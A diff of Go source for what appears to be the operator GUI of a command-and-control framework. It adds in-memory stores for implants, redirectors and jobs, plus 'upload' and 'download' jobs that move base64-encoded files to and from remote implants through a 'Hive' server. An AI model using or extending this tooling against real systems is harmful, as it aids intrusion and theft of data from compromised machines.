@@ -15,6 +15,10 @@ import (
     "os"
     "strings"
     "os/exec"
+    "io/ioutil"
+    "encoding/base64"
+    "strconv"
+    "sync"
 )
 
 ////Commands JSON, will fit in Job "parameter" field
@@ -78,7 +82,105 @@ type BiChecking struct{
     Hostname string `json:"hostname"`
 }
 
+
+type JobsMemoryDB struct {
+    mux  sync.RWMutex
+    Jobs []*Job
+}
+var jobsDB *JobsMemoryDB
+
+type LogsMemoryDB struct {
+    mux  sync.RWMutex
+    Logs []*Log
+}
+var logsDB *LogsMemoryDB
+
+type ImplantsMemoryDB struct {
+    mux  sync.RWMutex
+    Implants []*Implant
+}
+var implantsDB *ImplantsMemoryDB
+
+type VpsMemoryDB struct {
+    mux  sync.RWMutex
+    Vpss []*Vps
+}
+var vpsDB *VpsMemoryDB
+
+type DomainsMemoryDB struct {
+    mux  sync.RWMutex
+    Domains []*Domain
+}
+var domainsDB *DomainsMemoryDB
+
+type StagingsMemoryDB struct {
+    mux  sync.RWMutex
+    Stagings []*Staging
+}
+var stagingsDB *StagingsMemoryDB
+
+type RedsMemoryDB struct {
+    mux  sync.RWMutex
+    Redirectors []*Redirector
+}
+var redsDB *RedsMemoryDB
+
+type BisMemoryDB struct {
+    mux  sync.RWMutex
+    Bichitos []*Bichito
+}
+var bisDB *BisMemoryDB
+
+type ReportsMemoryDB struct {
+    mux  sync.RWMutex
+    Reports []*Report
+}
+var reportsDB *ReportsMemoryDB
+
+type lockObject struct {
+    mux  sync.RWMutex
+    Lock int
+}
+
+var lock *lockObject
+
 func guiHandler() {
+
+
+    //Initialize OnMem DB Data
+    var (
+        jobs        []*Job
+        logs        []*Log
+        implants    []*Implant
+        vpss        []*Vps
+        domains     []*Domain
+        stagings    []*Staging
+        redirectors []*Redirector
+        bichitos    []*Bichito
+        reports     []*Report
+    )
+
+    jobsDB =        &JobsMemoryDB{Jobs:jobs}
+    logsDB =        &LogsMemoryDB{Logs:logs}
+    implantsDB =    &ImplantsMemoryDB{Implants:implants}
+    vpsDB =         &VpsMemoryDB{Vpss:vpss}
+    domainsDB =     &DomainsMemoryDB{Domains:domains}
+    stagingsDB =    &StagingsMemoryDB{Stagings:stagings}
+    redsDB =        &RedsMemoryDB{Redirectors:redirectors}
+    bisDB =         &BisMemoryDB{Bichitos:bichitos}
+    reportsDB =     &ReportsMemoryDB{Reports:reports}
+    
+    lock = &lockObject{Lock:3}
+
+    getHive("jobs")
+    getHive("logs")
+    getHive("implants")
+    getHive("vps")
+    getHive("domains")
+    getHive("stagings")
+    getHive("bichitos")
+    getHive("redirectors")
+    getHive("reports")
 
 
     router := mux.NewRouter()
@@ -105,56 +207,74 @@ func guiHandler() {
 
 // Get methods for the GUI 
 func GetJobs(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(jobs)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(jobsDB.Jobs)
+    //if lock == 0 {go connectHive()}
+    
+    if(lock.Lock > -1){getHive("jobs")}
 }
 
 func GetLogs(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(logs)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(logsDB.Logs)
+
+    if lock.Lock > -1 {getHive("logs")}
 }
 
 func GetImplants(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(implants)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(implantsDB.Implants)
+
+    if lock.Lock > -1 {getHive("implants")}
 }
 
 func GetVps(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(vpss)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(vpsDB.Vpss)
+
+    if lock.Lock > -1 {getHive("vps")}
 }
 
 func GetDomains(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(domains)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(domainsDB.Domains)
+
+    if lock.Lock > -1 {getHive("domains")}
 }
 
 func GetStagings(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(stagings)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(stagingsDB.Stagings)
+
+    if lock.Lock > -1 {getHive("jobs")}
 }
 
 func GetReports(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(reports)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(reportsDB.Reports)
+
+    if lock.Lock > -1 {getHive("jobs")}
 }
 
 
 func GetRedirectors(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(redirectors)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(redsDB.Redirectors)
+
+    if lock.Lock > 0 {getHive("redirectors")}
 }
 
 func GetBichitos(w http.ResponseWriter, r *http.Request) {
-    json.NewEncoder(w).Encode(bichitos)
-    if lock == 0 {go connectHive()}
+    json.NewEncoder(w).Encode(bisDB.Bichitos)
+
+    if lock.Lock > 0 {getHive("bichitos")}
 }
 
 func CreateJob(w http.ResponseWriter, r *http.Request) {
     var(
         job Job
     )
-    
+
+    //jobsToSend.mux.Lock()
+    //defer jobsToSend.mux.Unlock()
+
+    //Skip logs when there is a job/log overhead
+    //if len(jobsToSend.Jobs) > 5 {
+    //    return
+    //}
+
     buf := new(bytes.Buffer)
     buf.ReadFrom(r.Body)
 
@@ -164,15 +284,113 @@ func CreateJob(w http.ResponseWriter, r *http.Request) {
     //DEcode JSOn Job, add Jid, time and status
     errDaws := json.Unmarshal([]byte(buf.String()),&job)
     if errDaws != nil {
-        fmt.Println("Error Decoding JSon"+ errDaws.Error())
+        fmt.Println("Error Decoding Json"+ errDaws.Error())
     }
 
     job.Jid = jid
     job.Time = time
-    jobsToSend = append(jobsToSend,&job)
-    fmt.Fprint(w, "[{\"jid\":\""+jid+"\"}]")
 
-    if lock == 0 {go connectHive()} 
+    //Prepare Upload Command: Read Operator file to upload and put into the Job
+    if (job.Job == "upload"){
+        
+        //Use spaces to get both argumens, if not two of them error
+        arguments := strings.Split(job.Parameters," ")
+        if len(arguments) != 2 {
+            fmt.Println("Incorrect Number of params")
+        }  
+        //Read first argument as a PATH file
+        data, err := ioutil.ReadFile(arguments[0])
+        if err != nil {
+            fmt.Println("Error Reading File: "+err.Error())
+        }
+
+        //Set the output of the file on "Result"
+        job.Result = base64.StdEncoding.EncodeToString(data)
+
+    }
+
+    //Prepare Download Command: Get JID result from Hive and decode it into target
+    if (job.Job == "download"){
+        //Use spaces to get both argumens, if not two of them error
+        arguments := strings.Split(job.Parameters," ")
+        if len(arguments) != 2 {
+            fmt.Println("Incorrect Number of params")
+        }  
+
+        go downloadJID(jid,job.Chid,arguments[1])
+    }
+
+
+
+    //jobsToSend.Jobs = append(jobsToSend.Jobs,&job)
+    
+
+    if lock.Lock > 0 {
+        go postHive(&job)
+        fmt.Fprint(w, "[{\"jid\":\""+jid+"\"}]")
+    }
+
+    return
+}
+
+
+//Download from Hive the result from one particular JID,use bichito resptime to try 3 times
+func downloadJID(jid string,chid string,filepath string){
+
+    //Get bichito resptime
+    var resptime int
+    var result string
+    var errGetJob string
+
+    for _,bichito := range bisDB.Bichitos{
+        if chid == bichito.Bid{
+            resptime, _ = strconv.Atoi(bichito.Resptime)
+        }
+        
+    } 
+    fmt.Println(resptime)
+    //Try get result 3 times
+    tries := 3
+    for{
+        time.Sleep(time.Duration(resptime + 20) * time.Second)
+        errGetJob,result = getJIDResult(jid)
+        if errGetJob == "" {
+            break
+        }
+
+        //Debug
+        fmt.Println(errGetJob)
+        tries--
+        if tries == 0 {
+            fmt.Println("Failed to download File from Bichito")
+            return
+        }
+    }
+
+    fmt.Println(result)
+    //If data, b64 decode it and write it in target operator filepath 
+    decodedDownload, errD := base64.StdEncoding.DecodeString(result)
+    if errD != nil {
+        fmt.Println("Error b64 decoding Downloaded File: "+errD.Error())
+        return
+    }
+
+
+    download, err := os.Create(filepath)
+    if err != nil {
+        fmt.Println("DownlaodFile:" + err.Error())
+        return
+    }
+
+    defer download.Close()
+
+    if _, err = download.WriteString(string(decodedDownload)); err != nil {
+        fmt.Println("DownlaodFile:" + err.Error())
+        return
+    }
+
+    return
+
 }
 
 
@@ -276,10 +494,10 @@ func DownloadReport(w http.ResponseWriter, r *http.Request) {
     buf := new(bytes.Buffer)
     buf.ReadFrom(r.Body)
     
-    //DEcode JSOn Job, add Jid, time and status
+    //Decode Json Job, add Jid, time and status
     errDaws := json.Unmarshal([]byte(buf.String()),&report)
     if errDaws != nil {
-        fmt.Println("Error Decoding JSon"+ errDaws.Error())
+        fmt.Println("Error Decoding Json"+ errDaws.Error())
     }
 
     error := getReport(report.Name)
